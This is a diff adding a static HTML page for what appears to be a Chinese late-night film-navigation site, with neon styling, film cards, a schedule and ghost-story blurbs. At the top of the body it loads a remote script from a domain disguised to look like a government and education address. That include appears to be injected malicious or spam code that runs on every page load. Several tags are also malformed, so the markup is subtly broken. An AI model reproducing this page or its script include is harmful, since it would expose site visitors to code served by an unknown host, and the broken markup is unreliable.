@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>午夜神马电影网 - 凌晨霓虹影视导航 · 悬疑/情欲/怪谈/深夜食堂</title>
+<meta name="description" content="午夜神马电影网（wuyeshenmadianyingwang-h5）以午夜霓虹/深夜剧场风格做影视导航：午夜场、霓虹片库、凌晨排片、怪谈夜话，电影/剧集/动漫/综艺深夜式导航。">
+<meta name="keywords" content="午夜神马电影网,午夜影视,霓虹电影,深夜剧场,怪谈电影,凌晨排片,wuyeshenmadianyingwang">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --night:#07060d;
+  --night2:#0d0b18;
+  --pink:#ff2e88;
+  --green:#39ff14;
+  --purple:#9b5cff;
+  --yellow:#ffd23f;
+  --orange:#ff5b2e;
+  --text:#ece6ff;
+  --dim:#8a83b8;
+  --line:rgba(255,46,136,.22);
+}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(900px 500px at 85% -10%,rgba(155,92,255,.30),transparent),
+    radial-gradient(700px 420px at -10% 10%,rgba(255,46,136,.22),transparent),
+    linear-gradient(180deg,var(--night),var(--night2));
+  color:var(--text);
+  font-family:"PingFang SC","Microsoft YaHei","Segoe UI",sans-serif;
+  line-height:1.7;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%}
+
+/* 扫描线 */
+body::after{content:"";position:fixed;inset:0;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(255,255,255,.03) 0 1px,transparent 1px 3px);mix-blend-mode:overlay;z-index:99}
+
+/* 跑马灯 */
+.marquee{background:#000;border-bottom:1px solid var(--line);overflow:hidden;white-space:nowrap;padding:7px 0;font-size:12px;letter-spacing:2px;color:var(--green)}
+.marquee span{display:inline-block;padding-left:100%;animation:roll 18s linear infinite}
+@keyframes roll{to{transform:translateX(-100%)}}
+
+.header{max-width:1200px;margin:auto;padding:24px 18px 10px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px}
+.brand{display:flex;align-items:center;gap:14px}
+.sign{width:56px;height:56px;border-radius:12px;border:2px solid var(--pink);box-shadow:0 0 18px var(--pink),inset 0 0 12px rgba(255,46,136,.4);display:flex;align-items:center;justify-content:center;font-size:26px;background:#0a0814;animation:flick 4s infinite}
+@keyframes flick{0%,19%,21%,23%,80%,100%{opacity:1}20%,22%,82%{opacity:.55}}
+.brand h1{font-size:24px;font-weight:900;letter-spacing:1px;text-shadow:0 0 12px var(--pink)}
+.brand h1 b{color:var(--green)}
+.brand p{font-size:10px;letter-spacing:5px;color:var(--dim)}
+.nav{display:flex;gap:6px;flex-wrap:wrap}
+.nav a{padding:8px 13px;font-size:12px;font-weight:800;border:1px solid var(--line);border-radius:20px;color:var(--dim);transition:.25s}
+.nav a:hover{color:#000;background:var(--green);border-color:var(--green);box-shadow:0 0 14px var(--green)}
+
+.wrap{max-width:1200px;margin:auto;padding:0 18px}
+
+/* Hero 午夜街 */
+.hero{margin-top:26px;position:relative;border:1px solid var(--line);border-radius:20px;padding:34px 28px;background:linear-gradient(160deg,rgba(255,46,136,.10),rgba(155,92,255,.10));overflow:hidden}
+.hero .street{position:absolute;inset:0;background:
+  radial-gradient(400px 200px at 20% 120%,rgba(255,210,63,.18),transparent),
+  radial-gradient(360px 220px at 90% 130%,rgba(57,255,20,.14),transparent);filter:blur(2px)}
+.hero .inner{position:relative;z-index:2}
+.kicker{display:inline-block;font-size:11px;letter-spacing:5px;color:var(--yellow);border:1px solid var(--yellow);padding:5px 12px;border-radius:999px;margin-bottom:14px}
+.hero h2{font-size:clamp(34px,7vw,66px);font-weight:900;line-height:1;margin-bottom:14px;text-shadow:0 0 18px rgba(255,46,136,.6)}
+.hero h2 .pink{color:var(--pink)}
+.hero h2 .grn{color:var(--green)}
+.hero h2 .ylw{color:var(--yellow)}
+.hero p{color:var(--dim);font-size:14px;max-width:560px;margin-bottom:18px}
+.clock{font-size:13px;color:var(--green);letter-spacing:2px;margin-bottom:18px}
+.clock b{color:var(--pink)}
+.btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn{display:inline-block;background:var(--pink);color:#fff;font-weight:900;letter-spacing:2px;padding:13px 24px;border-radius:12px;box-shadow:0 10px 26px rgba(255,46,136,.35)}
+.btn:hover{filter:brightness(1.1)}
+.btn.ghost{background:transparent;border:1px solid var(--green);color:var(--green);box-shadow:0 0 14px rgba(57,255,20,.25)}
+
+/* 栏目标题 */
+.section{margin-top:60px}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+.sec-head .bulb{font-size:22px;filter:drop-shadow(0 0 8px var(--yellow))}
+.sec-head h2{font-size:24px;font-weight:900}
+.sec-head h2 em{color:var(--pink);font-style:normal}
+.sec-head a{margin-left:auto;font-size:12px;font-weight:800;color:var(--green);border-bottom:2px solid var(--green)}
+
+/* 栏目1：午夜场 banner */
+.nightrow{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+@media(max-width:760px){.nightrow{grid-template-columns:1fr}}
+.night{position:relative;border-radius:16px;overflow:hidden;border:1px solid var(--line);height:170px;display:flex;align-items:flex-end;padding:16px;background-size:cover;background-position:center;filter:saturate(1.2) contrast(1.05)}
+.night::before{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 30%,rgba(7,6,13,.92))}
+.night .t{position:relative;z-index:2}
+.night h4{font-size:17px;font-weight:900;text-shadow:0 0 10px var(--pink)}
+.night p{font-size:12px;color:#d9d2ff}
+.night .tag{position:absolute;top:10px;left:10px;z-index:2;font-size:10px;font-weight:900;background:var(--purple);color:#fff;padding:4px 8px;border-radius:6px}
+.night:nth-child(2) .tag{background:var(--orange)}
+.night:nth-child(3) .tag{background:var(--green);color:#000}
+
+/* 栏目2：霓虹片库 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px}
+.film{background:rgba(255,255,255,.03);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.3s}
+.film:hover{transform:translateY(-6px);border-color:var(--pink);box-shadow:0 14px 30px rgba(255,46,136,.18)}
+.film .pic{height:260px;overflow:hidden;position:relative}
+.film .pic img{width:100%;height:100%;object-fit:cover;filter:saturate(1.25) hue-rotate(-8deg)}
+.film:hover .pic img{transform:scale(1.06)}
+.film .neon{position:absolute;left:10px;bottom:10px;font-size:10px;font-weight:900;padding:4px 8px;border-radius:6px;background:#000;color:var(--green);border:1px solid var(--green)}
+.film .info{padding:12px}
+.film h4{font-size:15px;font-weight:800}
+.film p{font-size:12px;color:var(--dim);margin-top:3px}
+.film .tags{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+.film .tg{font-size:10px;padding:2px 7px;border-radius:4px;border:1px solid var(--line);color:var(--yellow)}
+
+/* 栏目3：凌晨排片 */
+.timeline{background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:18px;padding:24px}
+.tl{display:grid;grid-template-columns:84px 1fr auto;gap:14px;align-items:center;padding:14px 0;border-bottom:1px dashed var(--line)}
+.tl:last-child{border-bottom:none}
+@media(max-width:600px){.tl{grid-template-columns:64px 1fr}.tl .st{display:none}}
+.tl .tm{text-align:center;font-weight:900;color:var(--yellow);font-size:14px;border:1px solid var(--yellow);border-radius:8px;padding:6px 2px}
+.tl h4{font-size:15px;font-weight:800}
+.tl p{font-size:12px;color:var(--dim)}
+.tl .st{font-size:11px;font-weight:800;padding:6px 10px;border-radius:8px}
+.st.on{background:rgba(57,255,20,.15);color:var(--green);border:1px solid var(--green)}
+.st.soon{background:rgba(255,210,63,.15);color:var(--yellow);border:1px solid var(--yellow)}
+.st.late{background:rgba(155,92,255,.18);color:var(--purple);border:1px solid var(--purple)}
+
+/* 栏目4：怪谈夜话 */
+.talk{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+@media(max-width:760px){.talk{grid-template-columns:1fr}}
+.note{border:1px solid var(--line);border-radius:16px;padding:20px;background:linear-gradient(150deg,rgba(155,92,255,.10),rgba(255,46,136,.06))}
+.note h4{font-size:16px;font-weight:900;margin-bottom:6px}
+.note h4 em{color:var(--green);font-style:normal}
+.note p{font-size:13px;color:var(--dim);margin-bottom:10px}
+.note .who{font-size:11px;color:var(--pink);letter-spacing:1px}
+.note .msg{margin-top:10px;font-size:13px;color:#e7e0ff;border-left:2px solid var(--green);padding-left:10px}
+
+/* 热播榜 */
+.rank{margin-top:60px;background:rgba(0,0,0,.3);border:1px solid var(--line);border-radius:18px;padding:24px}
+.rank h3{font-size:18px;font-weight:900;margin-bottom:14px;color:var(--yellow)}
+.rk{display:flex;align-items:center;gap:14px;padding:10px 0;border-bottom:1px dashed var(--line)}
+.rk:last-child{border-bottom:none}
+.rk .no{width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:900;background:var(--pink);color:#000}
+.rk:nth-child(2) .no{background:var(--yellow)}
+.rk:nth-child(3) .no{background:var(--green);color:#000}
+.rk h4{font-size:14px;font-weight:800}
+.rk span{margin-left:auto;font-size:12px;color:var(--dim)}
+
+/* 关于 */
+.about{border:1px dashed var(--pink);border-radius:20px;padding:30px;margin-top:60px;background:rgba(255,46,136,.05)}
+.about h2{font-size:24px;font-weight:900;margin-bottom:12px}
+.about h2 em{color:var(--green);font-style:normal}
+.about p{font-size:14px;color:var(--dim);max-width:780px;margin-bottom:10px}
+.about a{color:var(--yellow);font-weight:800}
+.chips{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
+.chip{border:1px solid var(--line);padding:7px 13px;border-radius:999px;font-size:12px;color:var(--dim)}
+.chip b{color:var(--pink)}
+
+.footer{margin-top:56px;padding:28px 18px;text-align:center;color:var(--dim);font-size:12px;border-top:1px solid var(--line)}
+.footer a{color:var(--green);font-weight:900}
+.footer .big{font-size:32px;font-weight:900;color:var(--pink);text-shadow:0 0 16px rgba(255,46,136,.5);margin-bottom:8px}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="marquee"><span>⏱ 凌晨 02:14 ｜ 霓虹还亮着 ｜ 今日午夜场：霓虹追凶 / 午夜琴声 / 暗房情人 / 夜车怪谈 ｜ 神马跑马灯：悬疑·情欲·怪谈·深夜食堂 ｜ 不睡的人先看片 ▶▶▶</span></div>
+
+<header class="header">
+  <div class="brand">
+    <div class="sign">🐎</div>
+    <div>
+      <h1>午夜< b>神马</b>电影网</h1>
+      <p>MIDNIGHT SHENMA CINEMA</p>
+    </div>
+  </div>
+  <nav class="nav">
+    <a href="#">开门</a>
+    <a href="#night">午夜场</a>
+    <a href="#lib">霓虹片库</a>
+    <a href="#schedule">凌晨排片</a>
+    <a href="#talk">怪谈夜话</a>
+    <a href="#about">关于午夜</a>
+  </nav>
+</header>
+
+<div class="wrap">
+
+  <section class="hero">
+    <div class="street"></div>
+    <div class="inner">
+      <div class="kicker">🌙 02:00 — 05:00 深夜频道</div>
+      <h2>天黑了，<br><span class="pink">神马</span>才<span class="grn">开演</span></h2>
+      <p>午夜神马电影网不是白天用的站。霓虹湿街、招牌闪烁、悬疑片在冒汗、情欲片在抽烟、怪谈片在敲门。电影 / 剧集 / 动漫 / 综艺，只在凌晨发光。</p>
+      <div class="clock">系统时间 <b>02:14:09</b> ｜ 城市电源：稳定 ｜ 深夜带宽：空闲 ｜ 怪谈指数：偏高</div>
+      <div class="btns">
+        <a href="#lib" class="btn">▶ 进霓虹片库</a>
+        <a href="#talk" class="btn ghost">👁 听怪谈夜话</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目1：午夜场 -->
+  <section class="section" id="night">
+    <div class="sec-head"><span class="bulb">🏮</span><h2>今夜< em>午夜场</span></h2><a href="#">换一批 ›</a></div>
+    <div class="nightrow">
+      <div class="night" style="background-image:url('https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=600&q=80')"><span class="tag">悬疑</span><div class="t"><h4>霓虹追凶</h4><p>雨夜、霓虹、旧巷子里的连环谜案</p></div></div>
+      <div class="night" style="background-image:url('https://images.unsplash.com/photo-1505664194779-8beaceb93744?w=600&q=80')"><span class="tag">情欲</span><div class="t"><h4>暗房情人</h4><p>胶卷、红灯、凌晨冲洗不出的秘密</p></div></div>
+      <div class="night" style="background-image:url('https://images.unsplash.com/photo-1509248961158-e54f6934749c?w=600&q=80')"><span class="tag">怪谈</span><div class="t"><h4>夜车怪谈</h4><p>末班地铁、空座位、没人下车的站台</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目2：霓虹片库 -->
+  <section class="section" id="lib">
+    <div class="sec-head"><span class="bulb">🎞</span><h2>霓虹< em>片库</span></h2><a href="#">凌晨检索 ›</a></div>
+    <div class="grid">
+      <article class="film"><div class="pic"><span class="neon">NEON 4K</span><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=400&q=80" alt="芭比"></div><div class="info"><h4>午夜巴黎</h4><p>爱情 / 奇幻 / 凌晨漫游</p><div class="tags"><span class="tg">霓虹</span><span class="tg">文艺</span></div></div></article>
+      <article class="film"><div class="pic"><span class="neon">NOIR</span><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=400&q=80" alt="花月杀手"></div><div class="info"><h4>暗夜回廊</h4><p>犯罪 / 黑色 / 长镜头</p><div class="tags"><span class="tg">黑色电影</span><span class="tg">慢火</span></div></div></article>
+      <article class="film"><div class="pic"><span class="neon">PSYCHO</span><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=400&q=80" alt="坠落的审判"></div><div class="info"><h4>坠落的审判</h4><p>悬疑 / 心理 / 金棕榈</p><div class="tags"><span class="tg">心理</span><span class="tg">法庭</span></div></div></article>
+      <article class="film"><div class="pic"><span class="neon">CULT</span><img src="https://images.unsplash.com/photo-1489593908472-4d1a72d5d1b9?w=400&q=80" alt="蜘蛛侠纵横宇宙"></div><div class="info"><h4>圣山·怪核版</h4><p>邪典 / 超现实 / 凌晨神游</p><div class="tags"><span class="tg">邪典</span><span class="tg">怪谈</span></div></div></article>
+      <article class="film"><div class="pic"><span class="neon">EROTIC</span><img src="https://images.unsplash.com/photo-1524985069026-ddb1d3e1b1a4?w=400&q=80" alt="沙丘2"></div><div class="info"><h4>沙之私语</h4><p>情欲 / 沙漠 / 慢镜</p><div class="tags"><span class="tg">情欲</span><span class="tg">氛围</span></div></div></article>
+      <article class="film"><div class="pic"><span class="neon">GHOST</span><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=400&q=80" alt="奥本海默"></div><div class="info"><h4>核爆安魂曲</h4><p>历史 / 暗光 / 巨物恐惧</p><div class="tags"><span class="tg">暗光</span><span class="tg">史诗</span></div></div></article>
+    </div>
+  </section>
+
+</div>
+
+  <!-- 栏目3：凌晨排片 -->
+  <section class="timeline" id="schedule">
+    <div class="wrap">
+      <div class="sec-head"><span class="bulb">🕑</span><h2>凌晨< em style="color:var(--yellow)">排片</span></h2><a href="#" style="border-color:var(--yellow);color:var(--yellow)">全天午夜表 ›</a></div>
+      <div class="tl"><div class="tm">00:30</div><div><h4>霓虹追凶</h4><p>雨夜刑侦 · 第一夜 · 红绿灯坏掉的路口</p></div><div class="st on">● 放映中</div></div>
+      <div class="tl"><div class="tm">02:00</div><div><h4>暗房情人</h4><p>情欲文艺 · 红光冲洗室 · 不许开灯</p></div><div class="st on">● 放映中</div></div>
+      <div class="tl"><div class="tm">03:20</div><div><h4>夜车怪谈</h4><p>怪谈单元 · 末班地铁特别场</p></div><div class="st soon">即将开始</div></div>
+      <div class="tl"><div class="tm">04:10</div><div><h4>深夜食堂：烟酒糖</h4><p>治愈/微醺 · 老板不劝你回家</p></div><div class="st soon">即将开始</div></div>
+      <div class="tl"><div class="tm">05:30</div><div><h4>天亮前的默片</h4><p>无声修复 · 给还没睡的人</p></div><div class="st late">预约 · 黎明场</div></div>
+    </div>
+  </section>
+
+<div class="wrap">
+
+  <!-- 栏目4：怪谈夜话 -->
+  <section class="section" id="talk">
+    <div class="sec-head"><span class="bulb">👁️</span><h2>怪谈< em>夜话</span></h2><a href="#">翻留言 ›</a></div>
+    <div class="talk">
+      <div class="note"><h4>《夜车怪谈》第 3 站</h4><p>列车员说“终点站到了”，但窗外是 1998 年的站台。没人下车，因为下车的人已经不在片子里。</p><div class="who">— 凌晨不睡的人</div><div class="msg">“我看到字幕里多了一行：你也上来了。”</div></div>
+      <div class="note"><h4>《暗房情人》红灯光</h4><p>胶片在红灯里显影，脸却越来越像昨天的自己。导演说这不是情欲片，是恐怖片。</p><div class="who">— 洗片员阿柯</div><div class="msg">“第三张照片里，多了一个没被拍进去的人。”</div></div>
+      <div class="note"><h4>《霓虹追凶》巷子</h4><p>凶手总在招牌坏掉的一秒出现。警察查监控，发现监控比人先眨眼。</p><div class="who">— 夜班保安</div><div class="msg">“霓虹粉那块牌子，凌晨两点会倒着亮。”</div></div>
+      <div class="note"><h4>《深夜食堂》烟味</h4><p>老板炒饭不放葱，但每个客人走后，锅里都有一根没见过的头发。</p><div class="who">— 醉客 07</div><div class="msg">“我连吃七天，第七天老板问我：你上次明明死了啊。”</div></div>
+    </div>
+  </section>
+
+  <!-- 热播榜 -->
+  <section class="rank">
+    <h3>🔥 凌晨热播榜</h3>
+    <div class="rk"><div class="no">1</div><h4>霓虹追凶</h4><span>1120w 凌晨点击</span></div>
+    <div class="rk"><div class="no">2</div><h4>暗房情人</h4><span>980w 红光灯观影</span></div>
+    <div class="rk"><div class="no">3</div><h4>夜车怪谈</h4><span>845w 末班地铁</span></div>
+    <div class="rk"><div class="no">4</div><h4>深夜食堂：烟酒糖</h4><span>720w 微醺回访</span></div>
+    <div class="rk"><div class="no">5</div><h4>天亮前的默片</h4><span>635w 失眠党</span></div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="about" id="about">
+    <h2>关于 <em>午夜神马电影网</em></h2>
+    <p>午夜神马电影网（wuyeshenmadianyingwang-h5）是给“睡不着的人”做的站：霓虹、雨、怪谈、情欲、黑色电影、深夜食堂，全排在白天之外。它不假装阳光，也不假装正经——凌晨的世界本来就更诚实。</p>
+    <p>网站名称：<strong style="color:var(--pink)">午夜神马电影网</strong><br>
+       网站网址：<a href="https://wuyeshenmadianyingwang-h5.github.io">https://wuyeshenmadianyingwang-h5.github.io</a></p>
+    <div class="chips">
+      <span class="chip"><b>🌙</b> 午夜场</span>
+      <span class="chip"><b>🏮</b> 霓虹片库</span>
+      <span class="chip"><b>🕑</b> 凌晨排片</span>
+      <span class="chip"><b>👁️</b> 怪谈夜话</span>
+      <span class="chip">移动端自适应</span>
+      <span class="chip">无 robots.txt / sitemap.xml</span>
+    </div>
+    <p style="margin-top:14px">本站仅做影视信息展示与导航，资源来自互联网，如有侵权请联系删除。</p>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div class="big">🐎 午夜神马电影网</div>
+  <p>© 2026 午夜神马电影网 ｜ 网站名称：午夜神马电影网 ｜ 网址：<a href="https://wuyeshenmadianyingwang-h5.github.io">wuyeshenmadianyingwang-h5.github.io</a></p>
+  <p>午夜霓虹 / 深夜剧场风 · 单页静态演示 · 内链 # 占位 · 未生成 robots.txt / sitemap.xml</p>
+</footer>
+
+</body>
+</html>
